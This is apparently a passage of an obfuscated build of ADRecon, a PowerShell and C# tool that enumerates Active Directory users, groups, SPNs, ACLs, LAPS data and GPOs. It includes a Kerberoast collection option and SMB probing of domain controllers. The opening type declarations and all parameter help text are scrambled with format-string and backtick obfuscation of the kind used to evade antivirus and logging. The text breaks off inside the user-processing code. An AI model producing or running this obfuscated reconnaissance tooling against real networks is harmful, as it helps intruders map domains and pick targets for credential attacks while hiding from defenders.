  set-ITem vaRiABle:1Fk  ([tyPE]("{4}{5}{0}{1}{3}{2}" -f'.HttP','U','itY','TIL','SystEM','.WeB') )  ;SEt-VaRiAble  4AGx  ( [TypE]("{0}{2}{1}" -F 'S','M.gc','YStE')) ;  $Thuje  =[tyPE]("{4}{8}{2}{6}{0}{1}{5}{3}{9}{7}" -f'Fice','.INTErOP.ex','Ft.o','.XLlIST','mIcroS','cEl','f','UrcEtYpe','O','oBjECtsO') ;  $K1U3M5 =[TYPe]("{9}{5}{4}{3}{12}{10}{2}{0}{6}{11}{7}{1}{8}" -f'Rop.','lYeS','TE','soF','rO','C','EXc','X','nOGuEsS','MI','N','eL.','T.OfFicE.I')  ;  SET-ItEM VAriABLe:l38R (  [TYpE]("{8}{7}{2}{0}{6}{5}{1}{3}{4}{9}" -F'.EXCel.X','soUR','Op','CE','T','le','lpivOttab','Ce.InTER','mIcRoSoft.OFfI','YpE')  )  ;seT-iTeM  VARiaBLe:GNv ( [type]("{6}{0}{8}{2}{9}{7}{1}{5}{3}{4}" -F'icROSOft.Of','ErSIO','NteRo','Is','t','nl','M','IVottaBLeV','fICE.i','p.exCeL.xlp') )  ;    SET-ITEM VArIaBLE:k59Z (  [TYpE]("{4}{2}{8}{3}{7}{9}{1}{0}{6}{10}{5}"-F'xLpIvOT','erop.ExCeL.','icr','Ft.Off','m','iOn','FieldcAl','icE.i','osO','NT','CUlaT')) ;sET  qP7 ( [TyPe]("{1}{0}{7}{2}{4}{9}{8}{6}{3}{5}"-F 'o','Micr','OffICE.i','.xLchArtTYp','ntERO','E','Xcel','soFT.','E','p.')  ) ;   Set  ('4A'+'tC')  (  [tYPE]("{0}{5}{7}{6}{4}{1}{2}{3}"-F'miCRoSo','excel.xLdiR','ecTi','oN','.','F','rOp','t.OFFIcE.inte') )  ;  SeT-vAriaBle  i03VO (  [TYpe]("{5}{6}{4}{3}{0}{8}{9}{7}{1}{2}"-f 'Te','Wc','oL','n','I','mI','CRosoFt.OFfICe.','RO','rOp.eXCel','.xL')  )  ;  $608g=  [tYpE]("{2}{7}{4}{1}{3}{8}{11}{0}{6}{10}{5}{9}" -F 'op.eXCEL.XLfOR','t.oFF','MI','i','OSOF','yP','mAT','cr','CE','e','cOnDITIOnT','.InTEr');  $7YbgK= [TYpe]("{10}{11}{2}{5}{3}{9}{1}{4}{6}{8}{7}{0}" -F'TION','EXcEl.X','.oFF','nT','L','IcE.i','p','iELdOrienta','ivotF','ERop.','micrOS','Oft')  ;   set-iTem  vaRIaBLE:Anbz ([typE]("{5}{3}{1}{4}{0}{7}{9}{6}{2}{8}" -f'e.I','I','LS','F','C','mICrosOfT.OF','xCel.X','NTE','oRtOrdEr','rop.E'));    $i0pbhV=[TyPe]("{2}{0}{1}{5}{4}{3}" -F'YsteM.drawI','Ng','S','ge','Ma','.i') ;    sv 94sag5  ( [TYPE]("{0}{1}" -F'MA','th') );  seT-iteM  ('va'+'r'+'ia'+'ble:y7co4') ([tyPE]("{0}{1}" -F 'a','rRay')); $xM0GK = [typE]("{1}{2}{0}"-F 'Rter','b','iTconVe')  ;SeT-VaRIABle f4e  (  [tYpE]("{2}{3}{1}{0}"-F 'rt','e','SySt','em.CoNv')); set f0s6i  ( [TyPe]("{3}{0}{4}{2}{1}"-f 's','Bject','CoMo','sY','tem.__')  ) ;   $HWN23  = [TYpE]("{1}{0}" -f 'RING','st');  $LBfud2=  [TYpe]("{2}{6}{8}{7}{0}{5}{1}{3}{4}" -F 'edIrEcTor','.','SYSTEm.Dir','dOMAi','n','Y','eCTorySE','S.acTiv','rVice'); Sv ("Y"+"d"+"lzcg") ([tYPe]("{3}{11}{4}{9}{10}{8}{1}{5}{7}{12}{0}{2}{6}"-f 'y.F','diRE','OR','sy','DiRE','CT','eSt','o','.aCtIVe','cTORY','seRviceS','stEm.','r')) ;  Sv  gxf (  [TYpE]("{11}{9}{5}{0}{6}{4}{3}{10}{1}{7}{2}{8}"-F 'Irec','c','ItYMas','S','Ory','TEm.d','T','UR','kS','s','ERVices.sE','Sy') ) ;  $BJ6  =  [TyPE]("{6}{4}{2}{3}{0}{1}{5}"-f 'eaDinG.tH','RE','.tH','r','teM','AD','sYS'); $QKV  =[TYPE]("{2}{0}{1}" -f'T','PtR','In') ;Sv XNJZS ([tYpe]("{0}{7}{9}{8}{6}{1}{5}{4}{2}{3}"-f'SYst','I','VI','CeS.MaRsHAl','ser','NteRop','NtiME.','E','.rU','M')  ) ;SEt-ITem ('V'+'arIABle:g'+'94'+'1F') ([tYPE]("{2}{1}{0}{3}{4}" -F'ON.aS','ti','rEflEc','sEMbL','y'))  ;    SET-iTem VARIAbLE:42n  ([type]("{1}{4}{5}{3}{2}{0}" -f'ERTER','sy','nv','eM.bITcO','S','t') ) ; $0528HS  = [TYpE]("{2}{1}{0}"-F'T','Er','CoNV') ;   sv it3v9e  ( [typE]("{0}{3}{2}{1}{4}" -F 'adrecON.a','a','wScL','d','Ss') ) ; SEt-iteM  ('VARi'+'a'+'bLe:GjA9')  (  [TYPe]("{8}{7}{1}{6}{4}{5}{3}{0}{2}"-F'Pwatc','gn','h','TO','tIc','s.s','oS','diA','sysTEm.') );  sv d761P (  [TYPe]("{1}{0}{2}{3}"-f 'lDaP','Adrecon.','C','LASs'))  ; Sv ("l"+"u1B") ([typE]("{3}{2}{0}{1}"-f 'eN','t','nviroNM','E')); sEt-ITEm vArIablE:YvumK ([TYPe]("{6}{5}{0}{4}{2}{3}{1}"-F'LEcTIo','SEmBLy','.','As','N','Ef','sYSteM.r'))  ;sV ('NK'+'5P') ( [TyPe]("{0}{4}{3}{2}{5}{1}" -F'm','L','EN','on.pscReD','AnAGeMent.AUtOmAti','tia')  ) ;

[CmdletBinding()]
param
(
    [Parameter(maNdAtOrY = ${FA`lse}, HelpmesSAGE = {"{5}{8}{4}{6}{7}{3}{10}{1}{2}{9}{0}" -f 'P','(default), ','L','s','h','Whi','od t','o u','ch met','DA','e; ADWS '})]
    [ValidateSet({"{0}{1}" -f 'A','DWS'}, {"{0}{1}"-f 'L','DAP'})]
    [string] ${mETH`od} = ("{0}{1}"-f 'AD','WS'),

    [Parameter(MaNdatOrY = ${FA`lse}, hELpMeSsaGE = {"{8}{7}{5}{2}{11}{4}{1}{10}{6}{0}{3}{9}"-f'in F','or ','r','QD','er IP Address ',' Cont','oma','n','Domai','N.','D','oll'})]
    [string] ${DoM`AINcoN`TrO`LLER} = '',

    [Parameter(mandatOrY = ${fa`LSE}, hElpMESSagE = {"{3}{2}{4}{1}{0}" -f 'ls.','redentia','mai','Do','n C'})]
    [Management.Automation.PSCredential] ${credeN`TI`Al} =  ( varIabLe Nk5P ).VaLue::"em`pTy",

    [Parameter(ManDAtOrY = ${Fa`LSE}, HeLPMessAGE = {"{35}{15}{2}{11}{31}{23}{14}{9}{27}{10}{12}{7}{29}{34}{16}{6}{33}{24}{21}{22}{1}{13}{8}{20}{4}{30}{19}{3}{28}{18}{25}{17}{0}{26}{32}{5}" -f'he ','th','o','is','eport.xlsx when Microsof','n ADRecon.','epo',' AD','DR','n','the CSV fi','utp','les to generate the','e A',' contai','h for ADRecon ','n-R','t','nstalled','el ','econ-R',' generate',' ','der','t to',' on ','host us','ing ',' not i','Rec','t Exc','ut fol','ed to ru','rt.xlsx. Use i','o','Pat'})]
    [string] ${gE`NEX`CeL},

    [Parameter(MaNdatory = ${F`AlSe}, HElpMeSSAge = {(("{6}{5}{13}{1}{28}{27}{10}{32}{20}{33}{0}{3}{8}{36}{15}{29}{7}{35}{22}{2}{26}{30}{16}{24}{12}{34}{4}{23}{18}{17}{31}{19}{11}{21}{25}{14}{9}" -f'SO',' for ADRecon ','on-Report.','N/HTML ','fie','a','P','and','f',')',' to','f ','ec','th','doesnmCUt exist','e',' (The ',' cre',' will be','ted i',' the CS','i','DRec','d','folder sp','t ','xl','older','output f','s ','sx.','a',' save','V/XML/J','i',' the A','il'))-CRePLACE  'mCU',[CHAR]39})]
    [string] ${out`PUt`diR},

    [Parameter(MandAtoRy = ${fAL`Se}, hELpmeSsAgE = {"{46}{112}{87}{52}{47}{63}{80}{86}{103}{65}{56}{89}{61}{90}{57}{30}{36}{5}{6}{43}{45}{34}{14}{62}{49}{115}{20}{58}{64}{106}{17}{78}{68}{104}{97}{102}{70}{24}{105}{66}{25}{67}{79}{60}{84}{26}{93}{4}{88}{11}{15}{69}{0}{8}{27}{76}{2}{94}{51}{55}{9}{31}{98}{75}{99}{114}{39}{37}{40}{96}{71}{22}{92}{83}{38}{18}{91}{33}{74}{73}{59}{81}{48}{19}{110}{113}{85}{23}{108}{107}{1}{3}{12}{42}{53}{54}{109}{13}{10}{95}{50}{111}{72}{101}{29}{100}{21}{35}{77}{32}{7}{16}{28}{82}{44}{41}" -f 'b','NSZo','H','n','o',' exc','ept A',', Doma','nets, Sc','cy, Fi','Computers, Compu','es','e','Printers, ','beroast ','t, Domain, Trusts, Sit','in','n','w','nges, G','oma','ort, ',',',' ','Log','ali','l','he','Acco','R','main (Default al','neG','roast','es, Gr',', Ker','K','l','ontrol',', Pass','nC','ler','on','s, DNSR','C','ceLog','Ls','Whic',' ','Cha','d ','S, Bi','swordPol','s','ec','ords,','i','eparated; e.g','Do','i','r',' in','F','an','to run;','nAcco','ma s',' V','d valu','sus','es, Su','ce','Users','oc','s, G','oup','w','ma','erbe','t','es',' ','oup','untsusedforServi','serSPNs','c',',','C','odule','r',' ','orest,','ordAttribut',' U','ude: F','istory, Pas','terSPNs, LAP','s, ','f','rainedPass','or','ep','ker, ACLs, GPO','orServi','om','ed','on)','u','nks, D','GPOs, gPLi',' ','roupMember','tL','h m','s, OUs','dPolicy, Domai','D'})]
    [ValidateSet({"{0}{1}" -f 'Fores','t'}, {"{1}{0}" -f 'main','Do'}, {"{0}{1}"-f 'Trus','ts'}, {"{0}{1}"-f'Sit','es'}, {"{2}{1}{0}" -f 'ets','n','Sub'}, {"{0}{2}{1}" -f'S','hemaHistory','c'}, {"{1}{3}{0}{2}"-f'dPol','Pas','icy','swor'}, {"{6}{0}{5}{2}{1}{4}{3}" -f 'i','o','ssw','icy','rdPol','neGrainedPa','F'}, {"{3}{2}{1}{4}{0}" -f'rs','ro','nt','DomainCo','lle'}, {"{1}{0}" -f'sers','U'}, {"{1}{0}{2}"-f'erS','Us','PNs'}, {"{1}{4}{5}{2}{0}{3}"-f'but','P','dAttri','es','assw','or'}, {"{0}{1}"-f'Gro','ups'}, {"{1}{2}{0}{3}"-f 'hange','G','roupC','s'}, {"{2}{0}{1}{3}"-f 'roupMem','ber','G','s'}, 'OUs', {"{1}{0}"-f 'POs','G'}, {"{1}{0}{2}" -f 'Lin','gP','ks'}, {"{2}{1}{0}"-f 'nes','o','DNSZ'}, {"{0}{2}{1}"-f 'DNSRecor','s','d'}, {"{2}{0}{1}" -f 'r','s','Printe'}, {"{1}{0}"-f'omputers','C'}, {"{3}{1}{2}{0}" -f'Ns','er','SP','Comput'}, {"{0}{1}"-f 'LAP','S'}, {"{1}{0}{2}" -f 'tLo','Bi','cker'}, {"{0}{1}"-f'A','CLs'}, {"{1}{2}{0}"-f't','GPORep','or'}, {"{1}{2}{0}{3}"-f 'be','K','er','roast'}, {"{2}{4}{3}{1}{0}{6}{5}"-f 'e','vic','Doma','ccountsusedforSer','inA','ogon','L'}, {"{1}{2}{0}" -f'ault','D','ef'})]
    [array] ${COL`l`ECt} = ("{0}{2}{1}" -f'Defa','t','ul'),

    [Parameter(mAndAToRy = ${f`ALSe}, hElPmEssaGE = {("{0}{11}{8}{30}{7}{31}{10}{9}{27}{1}{15}{25}{13}{21}{24}{23}{29}{3}{26}{14}{17}{4}{28}{16}{2}{5}{18}{12}{22}{6}{19}{20}"-f 'Output type; Comm','OUT,C','p','e','T','ar','V a','a',' ','.',' e','a','er, else','XML,JSON,','l','S','th -Collect ','t S','amet','nd Ex','cel)','HT',' CS',',','ML','V,','l (Defau','g STD','DOUT wi','Exc','seper','ted;')})]
    [ValidateSet({"{1}{0}{2}" -f'TDOU','S','T'}, 'CSV', 'XML', {"{1}{0}" -f 'N','JSO'}, {"{0}{1}" -f'EXCE','L'}, {"{1}{0}" -f'ML','HT'}, 'All', {"{1}{0}" -f 'fault','De'})]
    [array] ${OUTPu`TT`Y`PE} = {"{0}{2}{1}" -f 'Defa','lt','u'},

    [Parameter(mandAtoRy = ${Fa`lse}, HElpMEssaGe = {"{10}{2}{9}{12}{0}{1}{7}{3}{5}{4}{8}{11}{6}"-f'm','ant acc','n','fau','t 9','l','s','ounts. De','0',' f','Timespa',' day','or Dor'})]
    [ValidateRange(1,1000)]
    [int] ${Do`R`ManTTIm`eSP`AN} = 90,

    [Parameter(mandAToRy = ${faL`SE}, HElpMEssagE = {"{0}{3}{7}{6}{2}{5}{4}{9}{1}{8}"-f 'Maximum mac','t 30 d','ord','hine accoun',' Defa',' age.','ssw','t pa','ays','ul'})]
    [ValidateRange(1,1000)]
    [int] ${p`Ass`maXAge} = 30,

    [Parameter(MandaTory = ${f`Al`SE}, heLPmESsAGE = {"{8}{1}{13}{4}{3}{15}{11}{12}{0}{6}{14}{9}{10}{16}{7}{5}{2}" -f 'he','h','lt 200',' for ',' set','au','r ','ef','T','je','ct','P se','arc','e PageSize to','ob','the LDA','. D'})]
    [ValidateRange(1,10000)]
    [int] ${PA`G`ESizE} = 200,

    [Parameter(MandATOry = ${f`AL`Se}, heLpmEssAGe = {"{0}{12}{10}{9}{2}{13}{7}{5}{8}{11}{6}{1}{4}{3}" -f'The n','cts. Defau','ads to','10','lt ','during processi','obje','e ','ng o','e','r of thr','f ','umbe',' us'})]
    [ValidateRange(1,100)]
    [int] ${T`hre`ADs} = 10,

    [Parameter(ManDATOrY = ${Fal`SE}, hELPMESSAGe = {"{5}{4}{7}{3}{1}{2}{6}{0}"-f'rt-Transcript',' ','St','ng','eate ADRecon Log u','Cr','a','si'})]
    [switch] ${l`og}
)

${adWSsO`U`Rce} = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Threading;
using System.DirectoryServices;
//using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO;
//using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class ADWSClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, "DomainControllers");
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, "SchemaHistory");
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "GroupChanges");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            ADWSClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            ADWSClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            ADWSClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case "DomainControllers":
                    return new DomainControllerRecordProcessor();
                case "SchemaHistory":
                    return new SchemaRecordProcessor();
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupChanges":
                    return new GroupChangeRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdDC = (PSObject) record;
                    bool Infra = false;
                    bool Naming = false;
                    bool Schema = false;
                    bool RID = false;
                    bool PDC = false;
                    PSObject DCSMBObj = new PSObject();

                    string OperatingSystem = CleanString((AdDC.Members["OperatingSystem"].Value != null ? AdDC.Members["OperatingSystem"].Value : "-") + " " + AdDC.Members["OperatingSystemHotfix"].Value + " " + AdDC.Members["OperatingSystemServicePack"].Value + " " + AdDC.Members["OperatingSystemVersion"].Value);

                    foreach (var OperationMasterRole in (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdDC.Members["OperationMasterRoles"].Value)
                    {
                        switch (OperationMasterRole.ToString())
                        {
                            case "InfrastructureMaster":
                            Infra = true;
                            break;
                            case "DomainNamingMaster":
                            Naming = true;
                            break;
                            case "SchemaMaster":
                            Schema = true;
                            break;
                            case "RIDMaster":
                            RID = true;
                            break;
                            case "PDCEmulator":
                            PDC = true;
                            break;
                        }
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty("Domain", AdDC.Members["Domain"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Site", AdDC.Members["Site"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Name", AdDC.Members["Name"].Value));
                    DCObj.Members.Add(new PSNoteProperty("IPv4Address", AdDC.Members["IPv4Address"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty("Hostname", AdDC.Members["HostName"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Infra", Infra));
                    DCObj.Members.Add(new PSNoteProperty("Naming", Naming));
                    DCObj.Members.Add(new PSNoteProperty("Schema", Schema));
                    DCObj.Members.Add(new PSNoteProperty("RID", RID));
                    DCObj.Members.Add(new PSNoteProperty("PDC", PDC));
                    if (AdDC.Members["IPv4Address"].Value != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.Members["IPv4Address"].Value);
                    }
                    else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", false));
                    }
                    foreach (PSPropertyInfo psPropertyInfo in DCSMBObj.Properties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == "SMB Port Open" && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSchema = (PSObject) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty("ObjectClass", AdSchema.Members["ObjectClass"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("Name", AdSchema.Members["Name"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("whenCreated", AdSchema.Members["whenCreated"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("whenChanged", AdSchema.Members["whenChanged"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSchema.Members["DistinguishedName"].Value));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    bool? Enabled = null;
                    bool MustChangePasswordatLogon = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool Dormant = false;
                    string SIDHistory = "";
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    bool? AccountNotDelegated = null;
                    bool? HasSPN = null;

                    try
                    {
                        // The Enabled field can be blank which raises an exception. This may occur when the user is not allowed to query the UserAccountControl attribute.
                        Enabled = (bool) AdUser.Members["Enabled"].Value;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                    }
                    if (AdUser.Members["lastLogonTimeStamp"].Value != null)
                    {
